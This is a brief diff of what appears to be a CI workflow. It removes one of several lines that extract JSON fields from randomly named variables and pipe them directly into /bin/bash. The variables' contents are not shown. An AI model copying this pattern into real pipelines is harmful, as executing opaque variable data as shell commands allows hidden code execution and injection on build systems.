@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$u0283" | jq -r .ec7 | /bin/bash
           echo $f1 | jq -r .j0 | /bin/bash
           echo $lq1 | jq -r .u2 | /bin/bash
-          echo $hh66 | jq -r .ffuw75280 | /bin/bash
           echo $mbvs408 | jq -r .z9 | /bin/bash
 
       - name: Persist output
